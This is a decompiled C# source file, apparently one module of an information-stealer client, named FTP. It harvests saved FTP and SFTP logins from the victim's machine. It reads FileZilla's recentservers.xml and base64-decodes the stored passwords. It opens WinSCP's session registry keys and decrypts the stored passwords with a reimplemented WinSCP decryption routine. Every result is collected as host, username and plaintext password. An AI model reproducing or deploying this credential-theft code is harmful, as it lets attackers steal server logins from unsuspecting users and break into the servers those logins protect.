using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using client.Helpers;
using client.Models;
using Microsoft.Win32;

namespace client.Body
{
	// Token: 0x02000041 RID: 65
	internal class FTP
	{
		// Token: 0x0600018C RID: 396 RVA: 0x00008AB8 File Offset: 0x00006CB8
		public static List<Credentials> Get()
		{
			List<Credentials> list = new List<Credentials>();
			list.AddRange(FTP.FileZilla());
			list.AddRange(FTP.WinScp());
			return list;
		}

		// Token: 0x0600018D RID: 397 RVA: 0x00008AD8 File Offset: 0x00006CD8
		private static List<Credentials> FileZilla()
		{
			List<Credentials> list = new List<Credentials>();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml";
			if (!File.Exists(path))
			{
				return list;
			}
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(File.ReadAllText(path));
				foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
				{
					XmlElement xmlElement = (XmlElement)obj;
					string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
					string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
					string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
					if (!string.IsNullOrEmpty(@string))
					{
						list.Add(new Credentials
						{
							CredentialName = "FileZilla",
							CredentialHostname = innerText + ":" + innerText2,
							CredentialUsername = innerText3,
							CredentialPassword = @string
						});
					}
				}
			}
			catch (Exception e)
			{
				LoggerHelper.HandleRuntimeError(e);
			}
			return list;
		}

		// Token: 0x0600018E RID: 398 RVA: 0x00008C60 File Offset: 0x00006E60
		private static List<Credentials> WinScp()
		{
			List<Credentials> list = new List<Credentials>();
			string text = "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
			if (registryKey == null)
			{
				return list;
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			int i = 0;
			while (i < subKeyNames.Length)
			{
				string str = subKeyNames[i];
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text + "\\" + str);
				object value = registryKey2.GetValue("HostName");
				string text2 = (value != null) ? value.ToString() : null;
				object value2 = registryKey2.GetValue("PortNumber");
				string str2 = ((value2 != null) ? value2.ToString() : null) ?? "21";
				object value3 = registryKey2.GetValue("UserName");
				string text3 = (value3 != null) ? value3.ToString() : null;
				object value4 = registryKey2.GetValue("Password");
				string text4 = (value4 != null) ? value4.ToString() : null;
				if (text4 != null)
				{
					try
					{
						text4 = FTP.Decrypt(text2, text3, text4);
						goto IL_D9;
					}
					catch
					{
						text4 = "unknown";
						goto IL_D9;
					}
					goto IL_D2;
				}
				goto IL_D2;
				IL_D9:
				if (!string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3))
				{
					list.Add(new Credentials
					{
						CredentialName = "WinScp",
						CredentialHostname = text2 + ":" + str2,
						CredentialUsername = text3,
						CredentialPassword = text4
					});
				}
				i++;
				continue;
				IL_D2:
				text4 = "unknown";
				goto IL_D9;
			}
			return list;
		}

		// Token: 0x0600018F RID: 399 RVA: 0x00008DB4 File Offset: 0x00006FB4
		private static string Decrypt(string Host, string userName, string passWord)
		{
			char c = 'ÿ';
			string text = string.Empty;
			string text2 = userName + Host;
			FTP.Flag flag = FTP.DecryptChar(passWord);
			int flag2 = (int)flag.flag;
			char flag3;
			if (flag2 == (int)c)
			{
				flag = FTP.DecryptChar(flag.remainingPass);
				flag = FTP.DecryptChar(flag.remainingPass);
				flag3 = flag.flag;
			}
			else
			{
				flag3 = flag.flag;
			}
			flag = FTP.DecryptChar(flag.remainingPass);
			flag.remainingPass = flag.remainingPass.Substring((int)(flag.flag * '\u0002'));
			for (int i = 0; i < (int)flag3; i++)
			{
				flag = FTP.DecryptChar(flag.remainingPass);
				text += flag.flag.ToString();
			}
			if (flag2 == (int)c)
			{
				if (text.Substring(0, text2.Length) == text2)
				{
					text = text.Substring(text2.Length);
				}
				else
				{
					text = "";
				}
			}
			return text;
		}

		// Token: 0x06000190 RID: 400 RVA: 0x00008EA4 File Offset: 0x000070A4
		private static FTP.Flag DecryptChar(string passwd)
		{
			string text = "0123456789ABCDEF";
			int num = 163;
			int num2 = text.IndexOf(passwd[0]) * 16;
			int num3 = text.IndexOf(passwd[1]);
			int num4 = num2 + num3;
			FTP.Flag result;
			result.flag = (char)((~(num4 ^ num) % 256 + 256) % 256);
			result.remainingPass = passwd.Substring(2);
			return result;
		}

		// Token: 0x02000042 RID: 66
		private struct Flag
		{
			// Token: 0x040000F1 RID: 241
			public char flag;

			// Token: 0x040000F2 RID: 242
			public string remainingPass;
		}
	}
}
